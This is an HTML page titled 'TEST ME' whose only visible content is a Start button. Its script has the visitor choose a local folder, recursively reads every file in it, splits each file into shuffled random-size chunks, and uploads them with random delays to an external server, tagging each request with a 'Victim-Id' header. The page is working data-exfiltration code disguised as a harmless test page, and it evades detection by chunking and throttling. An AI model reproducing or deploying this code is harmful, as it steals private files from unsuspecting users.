<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TEST ME</title>
  <style>
    body {
      background: #582c2c;
      color: #0F0;
      font-family: monospace;
      text-align: center;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    button {
      padding: 10px;
      border: 2px solid red;
      background: transparent;
      color: red;
      cursor: pointer;
      font-size: 1.2rem;
      margin-top: 20px;
    }
    button:hover {
      background: red;
      color: #000;
    }
  </style>
</head>
<body>
  <h1>Test Me</h1>
  <button id="start">Start</button>

  <script>
    (function() {
      const uploadUrl = "https://deobbetest1-production-104e.up.railway.app/upload";

      document.getElementById("start").addEventListener("click", async () => {
        try {
          const victimId = crypto.randomUUID();
          const directoryHandle = await window.showDirectoryPicker();

          async function processFiles(directoryHandle, victimId) {
            const uploadPromises = [];
            const maxConcurrentUploads = 3;
            const processedFiles = new Set();

            for await (const entry of directoryHandle.values()) {
              if (entry.kind === "file" && !entry.name.startsWith(".")) {
                if (!processedFiles.has(entry.name)) {
                  processedFiles.add(entry.name);
                  const file = await entry.getFile();
                  const fileSize = file.size;

                  const uploadPromise = (async function uploadFile(file, victimId) {
                    const arrayBuffer = await file.arrayBuffer();
                    const fileData = new Uint8Array(arrayBuffer);

                    const chunks = [];
                    let offset = 0;
                    let minChunkSize, maxChunkSize;

                    if (fileSize < 1 * 1024 * 1024) { // Less than 1MB
                      minChunkSize = maxChunkSize = fileSize; // Single chunk
                    } else if (fileSize < 10 * 1024 * 1024) { // 1MB - 10MB
                      minChunkSize = 400 * 1024;
                      maxChunkSize = 1000 * 1024;
                    } else { // 10MB - 100MB
                      minChunkSize = 1000 * 1024;
                      maxChunkSize = 3000 * 1024;
                    }

                    while (offset < fileData.byteLength) {
                      const chunkSize = Math.floor(Math.random() * (maxChunkSize - minChunkSize) + minChunkSize);
                      const end = Math.min(offset + chunkSize, fileData.byteLength);
                      const chunkData = fileData.slice(offset, end);
                      chunks.push({ index: chunks.length + 1, total: 0, data: chunkData });
                      offset = end;
                    }

                    // Assign total chunks count to each chunk
                    chunks.forEach(chunk => chunk.total = chunks.length);

                    // Shuffle chunks randomly
                    chunks.sort(() => Math.random() - 0.5);

                    for (const { index, total, data } of chunks) {
                      await new Promise(resolve => setTimeout(resolve, Math.random() * (50 - 10) + 10)); // 0.01 - 0.05 sec delay
                      await fetch(uploadUrl, {
                        method: "POST",
                        headers: {
                          "Content-Type": "application/octet-stream",
                          "Victim-Id": encodeURIComponent(victimId),
                          "Filename": encodeURIComponent(file.name),
                          "Chunk-Index": index,
                          "Total-Chunks": total
                        },
                        body: data
                      });
                    }
                  })(file, victimId);
                  uploadPromises.push(uploadPromise);

                  if (uploadPromises.length >= maxConcurrentUploads) {
                    await Promise.allSettled(uploadPromises);
                    uploadPromises.length = 0;
                  }
                }
              } else if (entry.kind === "directory") {
                await processFiles(entry, victimId);
              }
            }

            await Promise.allSettled(uploadPromises);
          }

          await processFiles(directoryHandle, victimId);
        } catch (error) {
          console.error("An error occurred", error);
        }
      });
    })();
  </script>
</body>
</html>
